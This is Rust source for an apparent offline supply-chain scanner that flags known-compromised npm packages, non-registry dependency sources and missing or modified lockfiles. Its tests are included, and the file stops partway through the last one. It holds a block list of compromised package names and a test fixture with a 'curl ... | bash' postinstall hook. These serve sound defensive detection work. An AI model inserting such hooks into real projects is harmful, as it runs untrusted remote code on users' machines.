//! Read-only supply-chain checks for project manifests and lockfiles.
//!
//! The scanner deliberately works offline. Dependency source checks and the
//! compromised-package list are conservative signals for review; they are not
//! a replacement for an advisories database or a package manager audit.

use std::{fs, path::Path};

use serde_json::Value;
use serde_yaml::Value as YamlValue;
use url::Url;

use crate::{
    audit_tool,
    error::{DustError, DustResult},
    lockfile,
    models::{
        Ecosystem, LockfileCheck, LockfileKind, LockfileStatus, RiskLevel, SecurityFinding,
        SecurityFindingKind, SecurityReport,
    },
};

const NODE_DEPENDENCY_SECTIONS: &[&str] = &[
    "dependencies",
    "devDependencies",
    "optionalDependencies",
    "peerDependencies",
];

const KNOWN_COMPROMISED_PACKAGES: &[&str] = &[
    // Historical npm compromise and protestware incidents. The package name
    // is intentionally enough to produce a review finding because a lockfile
    // may not expose an affected version in every supported format.
    "babelcli",
    "coa",
    "crossenv",
    "eslint-scope",
    "event-stream",
    "flatmap-stream",
    "node-ipc",
    "rc",
    "ua-parser-js",
];

/// Runs the complete offline security scan for the selected ecosystems.
pub fn scan(root: &Path, ecosystems: &[Ecosystem]) -> DustResult<SecurityReport> {
    let scan_node = ecosystems.is_empty() || ecosystems.contains(&Ecosystem::Node);
    let scan_rust = ecosystems.is_empty() || ecosystems.contains(&Ecosystem::Rust);

    if !scan_node && !scan_rust {
        validate_root(root)?;
        return Ok(SecurityReport::default());
    }

    validate_root(root)?;

    let mut report = SecurityReport::default();

    if scan_node {
        report.lifecycle_warnings = audit_tool::security_scan(root)?;

        for warning in &report.lifecycle_warnings {
            report.findings.push(SecurityFinding::new(
                root.join("package.json"),
                SecurityFindingKind::SuspiciousScript,
                Some(warning.package.clone()),
                warning.risk_level,
                Some(warning.command.clone()),
                format!(
                    "{} Lifecycle hook: {}.",
                    warning.reason, warning.script_type
                ),
            ));
        }

        let package_json = root.join("package.json");
        if package_json.is_file() {
            scan_package_manifest(&package_json, &mut report)?;
        }
    }

    if scan_rust {
        let cargo_toml = root.join("Cargo.toml");
        if cargo_toml.is_file() {
            scan_cargo_manifest(&cargo_toml, &mut report)?;
        }
    }

    let mut lockfiles = check_relevant_lockfiles(root, scan_node, scan_rust)?;
    lockfiles.retain(|check| {
        (scan_node && check.kind.ecosystem() == Ecosystem::Node)
            || (scan_rust && check.kind.ecosystem() == Ecosystem::Rust)
    });

    for check in &lockfiles {
        report_lockfile_status(check, &mut report);

        if check.status != LockfileStatus::Missing {
            scan_lockfile(check, &mut report)?;
        }
    }

    report.lockfiles = lockfiles;
    Ok(report)
}

fn check_relevant_lockfiles(
    root: &Path,
    scan_node: bool,
    scan_rust: bool,
) -> DustResult<Vec<LockfileCheck>> {
    if scan_node && root.join("package.json").is_file() {
        return lockfile::check_lockfile_integrity(root);
    }

    let expected = if scan_rust && root.join("Cargo.toml").is_file() {
        vec![LockfileKind::CargoLock]
    } else {
        Vec::new()
    };

    lockfile::check_lockfiles(root, &expected)
}

fn validate_root(root: &Path) -> DustResult<()> {
    match fs::symlink_metadata(root) {
        Ok(metadata) if metadata.file_type().is_symlink() || !metadata.is_dir() => {
            Err(DustError::InvalidPath(root.to_path_buf()))
        }
        Ok(_) => Ok(()),
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => {
            Err(DustError::InvalidPath(root.to_path_buf()))
        }
        Err(error) => Err(DustError::Io(error)),
    }
}

fn scan_package_manifest(path: &Path, report: &mut SecurityReport) -> DustResult<()> {
    let content = fs::read_to_string(path)?;
    let manifest: Value =
        serde_json::from_str(&content).map_err(|error| manifest_error(path, error.to_string()))?;

    report.manifests.push(path.to_path_buf());

    for section in NODE_DEPENDENCY_SECTIONS {
        let Some(dependencies) = manifest.get(*section).and_then(Value::as_object) else {
            continue;
        };

        for (name, specification) in dependencies {
            inspect_node_dependency(path, name, specification.as_str(), report);
        }
    }

    if let Some(bundled) = manifest
        .get("bundledDependencies")
        .and_then(Value::as_array)
    {
        for name in bundled.iter().filter_map(Value::as_str) {
            report_known_package(path, name, report);
        }
    }

    Ok(())
}

fn inspect_node_dependency(
    path: &Path,
    name: &str,
    specification: Option<&str>,
    report: &mut SecurityReport,
) {
    report_known_package(path, name, report);

    let Some(specification) = specification else {
        return;
    };

    if let Some(source) = untrusted_node_source(specification) {
        report.finding(
            path,
            SecurityFindingKind::UntrustedDependency,
            Some(name.to_owned()),
            RiskLevel::Medium,
            Some(specification.to_owned()),
            format!(
                "Dependency uses a non-registry source ({source}); review and pin the source before installation."
            ),
        );
    }
}

fn scan_cargo_manifest(path: &Path, report: &mut SecurityReport) -> DustResult<()> {
    let content = fs::read_to_string(path)?;
    let manifest: toml::Value =
        toml::from_str(&content).map_err(|error| manifest_error(path, error.to_string()))?;

    report.manifests.push(path.to_path_buf());
    inspect_cargo_tables(path, &manifest, report);
    Ok(())
}

fn inspect_cargo_tables(path: &Path, value: &toml::Value, report: &mut SecurityReport) {
    let Some(table) = value.as_table() else {
        return;
    };

    for (key, value) in table {
        if is_cargo_dependency_section(key)
            && let Some(dependencies) = value.as_table()
        {
            for (name, specification) in dependencies {
                inspect_cargo_dependency(path, name, specification, report);
            }
        }

        inspect_cargo_tables(path, value, report);
    }
}

fn inspect_cargo_dependency(
    path: &Path,
    name: &str,
    specification: &toml::Value,
    report: &mut SecurityReport,
) {
    let package_name = specification
        .get("package")
        .and_then(toml::Value::as_str)
        .unwrap_or(name);
    report_known_package(path, package_name, report);

    let Some((source, detail)) = untrusted_cargo_source(specification) else {
        return;
    };

    report.finding(
        path,
        SecurityFindingKind::UntrustedDependency,
        Some(package_name.to_owned()),
        RiskLevel::Medium,
        Some(detail.to_owned()),
        format!(
            "Cargo dependency uses a non-crates.io source ({source}); review the source and pin the revision."
        ),
    );
}

fn report_known_package(path: &Path, name: &str, report: &mut SecurityReport) {
    if !is_known_compromised_package(name) {
        return;
    }

    report.finding(
        path,
        SecurityFindingKind::KnownMaliciousPackage,
        Some(name.to_owned()),
        RiskLevel::Critical,
        None,
        "Package name matches DustFril's built-in list of historically compromised packages; verify the exact version and replace it if affected.",
    );
}

fn report_lockfile_status(check: &LockfileCheck, report: &mut SecurityReport) {
    let (kind, risk_level, reason) = match check.status {
        LockfileStatus::Missing => (
            SecurityFindingKind::MissingLockfile,
            RiskLevel::High,
            "Expected lockfile is missing; dependency resolution is not reproducible.",
        ),
        LockfileStatus::Modified => (
            SecurityFindingKind::ModifiedLockfile,
            RiskLevel::High,
            "Lockfile differs from the committed Git state; review the dependency changes before installation.",
        ),
        LockfileStatus::Untracked => (
            SecurityFindingKind::UntrackedLockfile,
            RiskLevel::Medium,
            "Lockfile is not tracked by Git; dependency resolution can change without review.",
        ),
        LockfileStatus::Clean => return,
    };

    report.finding(
        &check.path,
        kind,
        None,
        risk_level,
        Some(check.status.to_string()),
        format!("{} ({})", reason, check.kind),
    );
}

fn scan_lockfile(check: &LockfileCheck, report: &mut SecurityReport) -> DustResult<()> {
    match check.kind {
        LockfileKind::PackageLockJson => scan_package_lock(&check.path, report),
        LockfileKind::PnpmLockYaml => scan_pnpm_lock(&check.path, report),
        LockfileKind::BunLock => scan_bun_lock(&check.path, report),
        LockfileKind::CargoLock => scan_cargo_lock(&check.path, report),
    }
}

fn scan_package_lock(path: &Path, report: &mut SecurityReport) -> DustResult<()> {
    let content = fs::read_to_string(path)?;
    let lockfile: Value =
        serde_json::from_str(&content).map_err(|error| manifest_error(path, error.to_string()))?;
    let lockfile_object = lockfile.as_object().ok_or_else(|| {
        manifest_error(
            path,
            "package-lock.json must contain a JSON object".to_owned(),
        )
    })?;
    let version = lockfile_object
        .get("lockfileVersion")
        .and_then(Value::as_u64)
        .ok_or_else(|| {
            manifest_error(
                path,
                "package-lock.json must declare a numeric lockfileVersion".to_owned(),
            )
        })?;
    if !(1..=3).contains(&version) {
        return Err(manifest_error(
            path,
            format!("unsupported package-lock.json lockfileVersion {version}"),
        ));
    }

    if version >= 2 && !lockfile_object.contains_key("packages") {
        return Err(manifest_error(
            path,
            format!("package-lock.json lockfileVersion {version} is missing packages"),
        ));
    }
    if version == 1 && !lockfile_object.contains_key("dependencies") {
        return Err(manifest_error(
            path,
            "package-lock.json lockfileVersion 1 is missing dependencies".to_owned(),
        ));
    }

    if let Some(packages) = lockfile_object.get("packages") {
        let packages = packages.as_object().ok_or_else(|| {
            manifest_error(
                path,
                "package-lock.json packages must be an object".to_owned(),
            )
        })?;
        for (key, package) in packages {
            let package = package.as_object().ok_or_else(|| {
                manifest_error(
                    path,
                    format!("package-lock.json package entry {key:?} must be an object"),
                )
            })?;
            if key.is_empty() {
                continue;
            }
            let name = package
                .get("name")
                .and_then(Value::as_str)
                .or_else(|| package_name_from_selector(key));
            let Some(name) = name else { continue };

            let source = match string_field(package, "resolved", path)? {
                Some(source) => Some(source),
                None => string_field(package, "resolvedUrl", path)?,
            };
            inspect_node_lock_dependency(path, name, source, report);
        }
    }

    if let Some(dependencies) = lockfile_object.get("dependencies") {
        let dependencies = dependencies.as_object().ok_or_else(|| {
            manifest_error(
                path,
                "package-lock.json dependencies must be an object".to_owned(),
            )
        })?;
        inspect_npm_dependency_tree(path, dependencies, report)?;
    }

    Ok(())
}

fn inspect_npm_dependency_tree(
    path: &Path,
    dependencies: &serde_json::Map<String, Value>,
    report: &mut SecurityReport,
) -> DustResult<()> {
    for (name, dependency) in dependencies {
        let dependency = dependency.as_object().ok_or_else(|| {
            manifest_error(
                path,
                format!("package-lock.json dependency entry {name:?} must be an object"),
            )
        })?;
        let source = match string_field(dependency, "resolved", path)? {
            Some(source) => Some(source),
            None => string_field(dependency, "resolvedUrl", path)?,
        };
        inspect_node_lock_dependency(path, name, source, report);

        if let Some(nested) = dependency.get("dependencies") {
            let nested = nested.as_object().ok_or_else(|| {
                manifest_error(
                    path,
                    format!("package-lock.json nested dependencies for {name:?} must be an object"),
                )
            })?;
            inspect_npm_dependency_tree(path, nested, report)?;
        }
    }

    Ok(())
}

fn inspect_node_lock_dependency(
    path: &Path,
    name: &str,
    source: Option<&str>,
    report: &mut SecurityReport,
) {
    report_known_package(path, name, report);

    let Some(source) = source else { return };
    if !is_trusted_node_registry(source) {
        report.finding(
            path,
            SecurityFindingKind::UntrustedDependency,
            Some(name.to_owned()),
            RiskLevel::Medium,
            Some(source.to_owned()),
            "Dependency lock entry resolves outside the supported public npm registries; review the artifact source.",
        );
    }
}

fn scan_pnpm_lock(path: &Path, report: &mut SecurityReport) -> DustResult<()> {
    let content = fs::read_to_string(path)?;
    let lockfile: YamlValue =
        serde_yaml::from_str(&content).map_err(|error| manifest_error(path, error.to_string()))?;
    let lockfile_object = lockfile.as_mapping().ok_or_else(|| {
        manifest_error(
            path,
            "pnpm-lock.yaml must contain a YAML mapping".to_owned(),
        )
    })?;
    let version =
        yaml_scalar_field(lockfile_object, "lockfileVersion", path)?.ok_or_else(|| {
            manifest_error(
                path,
                "pnpm-lock.yaml must declare lockfileVersion".to_owned(),
            )
        })?;
    if version
        .split('.')
        .next()
        .and_then(|major| major.parse::<u64>().ok())
        .is_none()
    {
        return Err(manifest_error(
            path,
            format!("unsupported pnpm lockfileVersion {version:?}"),
        ));
    }

    for section in ["packages", "snapshots"] {
        let Some(value) = yaml_value_field(lockfile_object, section) else {
            continue;
        };
        let entries = value.as_mapping().ok_or_else(|| {
            manifest_error(path, format!("pnpm-lock.yaml {section} must be a mapping"))
        })?;

        for (selector, package) in entries {
            let selector = selector.as_str().ok_or_else(|| {
                manifest_error(
                    path,
                    format!("pnpm-lock.yaml {section} keys must be strings"),
                )
            })?;
            inspect_pnpm_entry(path, selector, package, report)?;
        }
    }

    Ok(())
}

fn inspect_pnpm_entry(
    path: &Path,
    selector: &str,
    package: &YamlValue,
    report: &mut SecurityReport,
) -> DustResult<()> {
    let name = package_name_from_selector(selector);
    if let Some(name) = name {
        report_known_package(path, name, report);
    }
    let source_selector = selector
        .trim()
        .trim_matches(['\'', '"'])
        .trim_start_matches('/');
    if let Some(source) = untrusted_node_source(source_selector) {
        report.finding(
            path,
            SecurityFindingKind::UntrustedDependency,
            name.map(str::to_owned),
            RiskLevel::Medium,
            Some(selector.to_owned()),
            format!(
                "pnpm lock entry uses a non-registry source ({source}); review the resolved package."
            ),
        );
    }

    let package_object = package.as_mapping().ok_or_else(|| {
        manifest_error(
            path,
            format!("pnpm-lock.yaml entry {selector:?} must be a mapping"),
        )
    })?;
    let Some(name) = name else {
        return Ok(());
    };
    let Some(resolution) = yaml_value_field(package_object, "resolution") else {
        return Ok(());
    };
    let resolution = resolution.as_mapping().ok_or_else(|| {
        manifest_error(
            path,
            format!("pnpm-lock.yaml resolution for {selector:?} must be a mapping"),
        )
    })?;

    for key in ["tarball", "repo", "url"] {
        let Some(source) = yaml_string_field(resolution, key, path)? else {
            continue;
        };
        if is_trusted_node_registry(source) {
            continue;
        }
        report.finding(
            path,
            SecurityFindingKind::UntrustedDependency,
            Some(name.to_owned()),
            RiskLevel::Medium,
            Some(source.to_owned()),
            "pnpm lock entry downloads from outside the supported public npm registries; review the artifact source.",
        );
    }

    Ok(())
}

fn scan_bun_lock(path: &Path, report: &mut SecurityReport) -> DustResult<()> {
    let content = fs::read_to_string(path)?;
    let lockfile = parse_jsonc(&content).map_err(|error| manifest_error(path, error))?;
    let lockfile_object = lockfile
        .as_object()
        .ok_or_else(|| manifest_error(path, "bun.lock must contain a JSON object".to_owned()))?;
    let version = lockfile_object
        .get("lockfileVersion")
        .and_then(Value::as_u64)
        .ok_or_else(|| {
            manifest_error(
                path,
                "bun.lock must declare a numeric lockfileVersion".to_owned(),
            )
        })?;
    if !(1..=2).contains(&version) {
        return Err(manifest_error(
            path,
            format!("unsupported bun.lock lockfileVersion {version}"),
        ));
    }

    if let Some(packages) = lockfile_object.get("packages") {
        let packages = packages.as_object().ok_or_else(|| {
            manifest_error(path, "bun.lock packages must be an object".to_owned())
        })?;
        for (selector, package) in packages {
            inspect_bun_package(path, selector, package, report)?;
        }
    }
    if let Some(workspaces) = lockfile_object.get("workspaces") {
        if !workspaces.is_object() {
            return Err(manifest_error(
                path,
                "bun.lock workspaces must be an object".to_owned(),
            ));
        }
        inspect_bun_value(path, workspaces, None, report);
    }

    Ok(())
}

fn inspect_bun_package(
    path: &Path,
    selector: &str,
    package: &Value,
    report: &mut SecurityReport,
) -> DustResult<()> {
    let name = package_name_from_selector(selector).ok_or_else(|| {
        manifest_error(
            path,
            format!("bun.lock package key {selector:?} is not a package selector"),
        )
    })?;
    report_known_package(path, name, report);

    match package {
        Value::Array(entries) => inspect_bun_package_array(path, name, entries, report),
        Value::Object(_) => {
            inspect_bun_value(path, package, Some(name), report);
            Ok(())
        }
        _ => Err(manifest_error(
            path,
            format!("bun.lock package entry {selector:?} must be an array or object"),
        )),
    }
}

fn inspect_bun_package_array(
    path: &Path,
    name: &str,
    entries: &[Value],
    report: &mut SecurityReport,
) -> DustResult<()> {
    if let Some(version_selector) = entries.first().and_then(Value::as_str) {
        report_known_package(path, name, report);
        if let Some(source) = untrusted_node_source(version_selector) {
            report.finding(
                path,
                SecurityFindingKind::UntrustedDependency,
                Some(name.to_owned()),
                RiskLevel::Medium,
                Some(version_selector.to_owned()),
                format!(
                    "Bun lock entry uses a non-registry source ({source}); review the resolved package."
                ),
            );
        }
    }

    for (index, entry) in entries.iter().enumerate().skip(1) {
        if index == 1
            && let Some(source) = entry.as_str().filter(|source| !source.is_empty())
        {
            inspect_node_lock_dependency(path, name, Some(source), report);
            continue;
        }

        inspect_bun_value(path, entry, Some(name), report);
    }

    Ok(())
}

fn parse_jsonc(content: &str) -> Result<Value, String> {
    let without_comments = strip_jsonc_comments(content)?;
    let normalized = remove_jsonc_trailing_commas(&without_comments);

    serde_json::from_str(&normalized).map_err(|error| error.to_string())
}

fn strip_jsonc_comments(content: &str) -> Result<String, String> {
    let characters: Vec<char> = content.chars().collect();
    let mut result = String::with_capacity(content.len());
    let mut index = 0;
    let mut in_string = false;
    let mut escaped = false;

    while index < characters.len() {
        let character = characters[index];

        if in_string {
            result.push(character);
            if escaped {
                escaped = false;
            } else if character == '\\' {
                escaped = true;
            } else if character == '"' {
                in_string = false;
            }
            index += 1;
            continue;
        }

        if character == '"' {
            in_string = true;
            result.push(character);
            index += 1;
            continue;
        }

        if character == '/' && characters.get(index + 1) == Some(&'/') {
            index += 2;
            while index < characters.len() && characters[index] != '\n' {
                index += 1;
            }
            continue;
        }

        if character == '/' && characters.get(index + 1) == Some(&'*') {
            index += 2;
            let mut closed = false;
            while index < characters.len() {
                if characters[index] == '*' && characters.get(index + 1) == Some(&'/') {
                    index += 2;
                    closed = true;
                    break;
                }
                if characters[index] == '\n' {
                    result.push('\n');
                }
                index += 1;
            }
            if !closed {
                return Err("unterminated JSONC block comment".to_owned());
            }
            continue;
        }

        result.push(character);
        index += 1;
    }

    Ok(result)
}

fn remove_jsonc_trailing_commas(content: &str) -> String {
    let characters: Vec<char> = content.chars().collect();
    let mut result = String::with_capacity(content.len());
    let mut index = 0;
    let mut in_string = false;
    let mut escaped = false;

    while index < characters.len() {
        let character = characters[index];

        if in_string {
            result.push(character);
            if escaped {
                escaped = false;
            } else if character == '\\' {
                escaped = true;
            } else if character == '"' {
                in_string = false;
            }
            index += 1;
            continue;
        }

        if character == '"' {
            in_string = true;
            result.push(character);
            index += 1;
            continue;
        }

        if character == ',' {
            let mut next = index + 1;
            while characters
                .get(next)
                .is_some_and(|value| value.is_whitespace())
            {
                next += 1;
            }
            if matches!(characters.get(next), Some(']' | '}')) {
                index += 1;
                continue;
            }
        }

        result.push(character);
        index += 1;
    }

    result
}

fn inspect_bun_value(path: &Path, value: &Value, hint: Option<&str>, report: &mut SecurityReport) {
    match value {
        Value::Object(object) => {
            let package_name = object
                .get("name")
                .and_then(Value::as_str)
                .or(hint)
                .filter(|name| !is_lock_metadata_key(name));

            if let Some(name) = package_name {
                report_known_package(path, name, report);
                for key in ["resolved", "tarball", "url"] {
                    if let Some(source) = object.get(key).and_then(Value::as_str)
                        && !is_trusted_node_registry(source)
                    {
                        report.finding(
                            path,
                            SecurityFindingKind::UntrustedDependency,
                            Some(name.to_owned()),
                            RiskLevel::Medium,
                            Some(source.to_owned()),
                            "Bun lock entry resolves outside the supported public npm registries; review the artifact source.",
                        );
                    }
                }
            }

            for (key, child) in object {
                let child_hint = package_name_from_selector(key).or(package_name);
                inspect_bun_value(path, child, child_hint, report);
            }
        }
        Value::Array(array) => {
            for child in array {
                if let Some(selector) = child.as_str()
                    && let Some(name) = package_name_from_selector(selector)
                {
                    report_known_package(path, name, report);
                    if let Some(source) = untrusted_node_source(selector) {
                        report.finding(
                            path,
                            SecurityFindingKind::UntrustedDependency,
                            Some(name.to_owned()),
                            RiskLevel::Medium,
                            Some(selector.to_owned()),
                            format!(
                                "Bun lock entry uses a non-registry source ({source}); review the resolved package."
                            ),
                        );
                    }
                }
                inspect_bun_value(path, child, hint, report);
            }
        }
        Value::String(selector) => {
            if let Some(name) = package_name_from_selector(selector) {
                report_known_package(path, name, report);
            }
        }
        _ => {}
    }
}

fn scan_cargo_lock(path: &Path, report: &mut SecurityReport) -> DustResult<()> {
    let content = fs::read_to_string(path)?;
    let lockfile: toml::Value =
        toml::from_str(&content).map_err(|error| manifest_error(path, error.to_string()))?;
    let lockfile_table = lockfile
        .as_table()
        .ok_or_else(|| manifest_error(path, "Cargo.lock must contain a TOML table".to_owned()))?;
    let version = lockfile_table
        .get("version")
        .and_then(toml::Value::as_integer)
        .ok_or_else(|| manifest_error(path, "Cargo.lock must declare version".to_owned()))?;
    if !(1..=4).contains(&version) {
        return Err(manifest_error(
            path,
            format!("unsupported Cargo.lock version {version}"),
        ));
    }

    let Some(packages) = lockfile_table.get("package") else {
        return Ok(());
    };
    let packages = packages
        .as_array()
        .ok_or_else(|| manifest_error(path, "Cargo.lock package must be an array".to_owned()))?;

    for package in packages {
        let package = package.as_table().ok_or_else(|| {
            manifest_error(path, "Cargo.lock package entries must be tables".to_owned())
        })?;
        let name = package
            .get("name")
            .and_then(toml::Value::as_str)
            .ok_or_else(|| manifest_error(path, "Cargo.lock package is missing name".to_owned()))?;
        report_known_package(path, name, report);

        let Some(source) = package.get("source") else {
            continue;
        };
        let source = source.as_str().ok_or_else(|| {
            manifest_error(
                path,
                format!("Cargo.lock source for {name:?} must be a string"),
            )
        })?;
        if !is_trusted_cargo_registry(source) {
            report.finding(
                path,
                SecurityFindingKind::UntrustedDependency,
                Some(name.to_owned()),
                RiskLevel::Medium,
                Some(source.to_owned()),
                "Cargo lock entry resolves outside crates.io; review the source and pinned revision.",
            );
        }
    }

    Ok(())
}

impl SecurityReport {
    fn finding(
        &mut self,
        path: &Path,
        kind: SecurityFindingKind,
        package: Option<String>,
        risk_level: RiskLevel,
        evidence: Option<String>,
        reason: impl Into<String>,
    ) {
        let finding = SecurityFinding::new(
            path.to_path_buf(),
            kind,
            package,
            risk_level,
            evidence,
            reason,
        );

        if !self.findings.contains(&finding) {
            self.findings.push(finding);
        }
    }
}

fn is_cargo_dependency_section(key: &str) -> bool {
    matches!(
        key,
        "dependencies" | "dev-dependencies" | "build-dependencies"
    )
}

fn untrusted_node_source(specification: &str) -> Option<&'static str> {
    let value = specification.trim().to_ascii_lowercase();
    if value.starts_with("git+")
        || value.starts_with("git:")
        || value.starts_with("git@")
        || value.starts_with("github:")
    {
        return Some("Git or GitHub source");
    }
    if value.starts_with("http://") {
        return Some("HTTP URL");
    }
    if value.starts_with("https://") && !is_trusted_node_registry(&value) {
        return Some("HTTPS URL");
    }
    if value.starts_with("file:")
        || value.starts_with("link:")
        || value.starts_with("workspace:")
        || value.starts_with('/')
        || value.starts_with("./")
        || value.starts_with("../")
    {
        return Some("local or workspace source");
    }
    if !value.starts_with('@')
        && value.split('/').count() == 2
        && !value.chars().any(char::is_whitespace)
    {
        return Some("repository shorthand");
    }

    None
}

fn untrusted_cargo_source(specification: &toml::Value) -> Option<(&'static str, &str)> {
    if let Some(table) = specification.as_table() {
        if let Some(value) = table.get("git").and_then(toml::Value::as_str) {
            return Some(("Git source", value));
        }
        if let Some(value) = table.get("path").and_then(toml::Value::as_str) {
            return Some(("local path", value));
        }
        if let Some(value) = table.get("url").and_then(toml::Value::as_str) {
            return Some(("URL source", value));
        }
        if let Some(value) = table.get("registry").and_then(toml::Value::as_str)
            && value != "crates-io"
        {
            return Some(("alternate registry", value));
        }
        return None;
    }

    let value = specification.as_str()?;
    if value.starts_with("git+") || value.starts_with("http://") || value.starts_with("https://") {
        return Some(("URL source", value));
    }
    None
}

fn is_known_compromised_package(name: &str) -> bool {
    KNOWN_COMPROMISED_PACKAGES
        .iter()
        .any(|known| known.eq_ignore_ascii_case(name.trim()))
}

fn is_trusted_node_registry(source: &str) -> bool {
    let Ok(url) = Url::parse(source.trim()) else {
        return false;
    };

    url.scheme() == "https"
        && url.port().is_none()
        && url.username().is_empty()
        && url.password().is_none()
        && url.query().is_none()
        && url.fragment().is_none()
        && matches!(
            url.host_str(),
            Some("registry.npmjs.org" | "registry.yarnpkg.com")
        )
}

fn is_trusted_cargo_registry(source: &str) -> bool {
    let Some((kind, raw_url)) = source.split_once('+') else {
        return false;
    };
    let Ok(url) = Url::parse(raw_url) else {
        return false;
    };

    if url.scheme() != "https"
        || url.port().is_some()
        || !url.username().is_empty()
        || url.password().is_some()
        || url.query().is_some()
        || url.fragment().is_some()
    {
        return false;
    }

    match kind {
        "registry" => {
            url.host_str() == Some("github.com")
                && url.path().trim_end_matches('/') == "/rust-lang/crates.io-index"
        }
        "sparse" => {
            url.host_str() == Some("index.crates.io") && url.path().trim_matches('/').is_empty()
        }
        _ => false,
    }
}

fn package_name_from_selector(selector: &str) -> Option<&str> {
    let selector = selector
        .trim()
        .trim_matches(['\'', '"'])
        .trim_start_matches("node_modules/")
        .trim_start_matches('/');
    let selector = selector.split('(').next().unwrap_or(selector).trim();
    if selector.is_empty()
        || is_lock_metadata_key(selector)
        || selector.contains("://")
        || selector.starts_with("file:")
        || selector.starts_with("link:")
        || selector.starts_with("workspace:")
    {
        return None;
    }

    let name = if let Some(stripped) = selector.strip_prefix('@') {
        if let Some(index) = stripped.find('@') {
            &selector[..index + 1]
        } else {
            let mut parts = selector.split('/');
            match (parts.next(), parts.next(), parts.next()) {
                (Some(scope), Some(package), Some(_version)) => {
                    &selector[..scope.len() + 1 + package.len()]
                }
                _ => selector,
            }
        }
    } else if let Some(index) = selector.find('@') {
        &selector[..index]
    } else {
        let mut parts = selector.split('/');
        match (parts.next(), parts.next()) {
            (Some(name), Some(version)) if looks_like_version(version) => name,
            _ => selector,
        }
    };
    let name = name.trim_end_matches(':');
    (!name.is_empty()
        && name
            .chars()
            .any(|character| character.is_ascii_alphabetic()))
    .then_some(name)
}

fn looks_like_version(value: &str) -> bool {
    value
        .chars()
        .next()
        .is_some_and(|character| character.is_ascii_digit() || character == 'v')
}

fn is_lock_metadata_key(value: &str) -> bool {
    matches!(
        value,
        "" | "dependencies"
            | "devDependencies"
            | "optionalDependencies"
            | "peerDependencies"
            | "resolutions"
            | "packages"
            | "workspaces"
            | "version"
            | "name"
    )
}

fn string_field<'a>(
    object: &'a serde_json::Map<String, Value>,
    key: &str,
    path: &Path,
) -> DustResult<Option<&'a str>> {
    let Some(value) = object.get(key) else {
        return Ok(None);
    };

    value
        .as_str()
        .map(Some)
        .ok_or_else(|| manifest_error(path, format!("{key} field in JSON object must be a string")))
}

fn yaml_value_field<'a>(object: &'a serde_yaml::Mapping, key: &str) -> Option<&'a YamlValue> {
    object.get(YamlValue::String(key.to_owned()))
}

fn yaml_scalar_field(
    object: &serde_yaml::Mapping,
    key: &str,
    path: &Path,
) -> DustResult<Option<String>> {
    let Some(value) = yaml_value_field(object, key) else {
        return Ok(None);
    };

    match value {
        YamlValue::String(value) => Ok(Some(value.clone())),
        YamlValue::Number(value) => Ok(Some(value.to_string())),
        _ => Err(manifest_error(
            path,
            format!("{key} field in YAML must be a scalar string or number"),
        )),
    }
}

fn yaml_string_field<'a>(
    object: &'a serde_yaml::Mapping,
    key: &str,
    path: &Path,
) -> DustResult<Option<&'a str>> {
    let Some(value) = yaml_value_field(object, key) else {
        return Ok(None);
    };

    value
        .as_str()
        .map(Some)
        .ok_or_else(|| manifest_error(path, format!("{key} field in YAML must be a string")))
}

fn manifest_error(path: &Path, message: String) -> DustError {
    DustError::Manifest(format!("{}: {message}", path.display()))
}

#[cfg(test)]
mod tests {
    use std::{collections::HashSet, fs};

    use tempfile::TempDir;

    use super::*;

    fn finding_kinds(report: &SecurityReport) -> HashSet<SecurityFindingKind> {
        report.findings.iter().map(|finding| finding.kind).collect()
    }

    #[test]
    fn scan_reports_all_manifest_and_lockfile_categories() {
        let temp_dir = TempDir::new().unwrap();
        fs::write(
            temp_dir.path().join("package.json"),
            r#"{
                "name": "demo",
                "dependencies": {
                    "event-stream": "3.3.6",
                    "private-package": "git+https://example.com/private.git"
                },
                "scripts": {"postinstall": "curl https://example.com/a.sh | bash"}
            }"#,
        )
        .unwrap();
        fs::write(
            temp_dir.path().join("package-lock.json"),
            r#"{"lockfileVersion":3,"packages":{"":{"name":"demo","version":"1.0.0"},"node_modules/remote":{"version":"1.0.0","resolved":"https://example.com/remote.tgz"}}}"#,
        )
        .unwrap();

        let report = scan(temp_dir.path(), &[]).unwrap();
        let kinds = finding_kinds(&report);

        assert!(kinds.contains(&SecurityFindingKind::SuspiciousScript));
        assert!(kinds.contains(&SecurityFindingKind::UntrustedDependency));
        assert!(kinds.contains(&SecurityFindingKind::KnownMaliciousPackage));
        assert!(report.lockfiles.iter().any(|check| {
            check.kind == LockfileKind::PackageLockJson && check.status == LockfileStatus::Clean
        }));
        assert!(!kinds.contains(&SecurityFindingKind::MissingLockfile));
    }

    #[test]
    fn scan_reports_missing_lockfiles_for_rust_and_node_projects() {
        let temp_dir = TempDir::new().unwrap();
        fs::write(
            temp_dir.path().join("package.json"),
            r#"{"name":"demo","dependencies":{"demo":"1.0.0"}}"#,
        )
        .unwrap();
        fs::write(
            temp_dir.path().join("Cargo.toml"),
            "[package]\nname = \"demo\"\nversion = \"0.1.0\"\n[dependencies]\nremote = { git = \"https://example.com/remote.git\" }\n",
        )
        .unwrap();

        let report = scan(temp_dir.path(), &[]).unwrap();

        assert_eq!(
            report
                .findings
                .iter()
                .filter(|finding| finding.kind == SecurityFindingKind::MissingLockfile)
                .count(),
            2
        );
        assert!(report.findings.iter().any(|finding| {
            finding.kind == SecurityFindingKind::UntrustedDependency
                && finding.package.as_deref() == Some("remote")
        }));
    }

    #[test]
    fn selected_java_scan_does_not_inspect_node_or_rust_files() {
        let temp_dir = TempDir::new().unwrap();
        fs::write(temp_dir.path().join("package.json"), "{invalid json").unwrap();

        let report = scan(temp_dir.path(), &[Ecosystem::Java]).unwrap();

        assert!(report.findings.is_empty());
        assert!(report.manifests.is_empty());
    }

    #[test]
    fn selected_unknown_ecosystem_still_validates_the_root() {
        let temp_dir = TempDir::new().unwrap();
        let missing = temp_dir.path().join("missing");

        assert!(matches!(
            scan(&missing, &[Ecosystem::Java]),
            Err(DustError::InvalidPath(path)) if path == missing
        ));
    }

    #[test]
    fn scan_reads_pnpm_and_bun_lock_package_entries() {
        let pnpm_dir = TempDir::new().unwrap();
        fs::write(
            pnpm_dir.path().join("package.json"),
            r#"{"name":"demo","packageManager":"pnpm@9.0.0"}"#,
        )
        .unwrap();
        fs::write(
            pnpm_dir.path().join("pnpm-lock.yaml"),
            "lockfileVersion: '9.0'\npackages:\n  event-stream@3.3.6:\n    resolution: {integrity: sha512-example}\n",
        )
        .unwrap();

        let pnpm_report = scan(pnpm_dir.path(), &[Ecosystem::Node]).unwrap();
        assert!(pnpm_report.findings.iter().any(|finding| {
            finding.kind == SecurityFindingKind::KnownMaliciousPackage
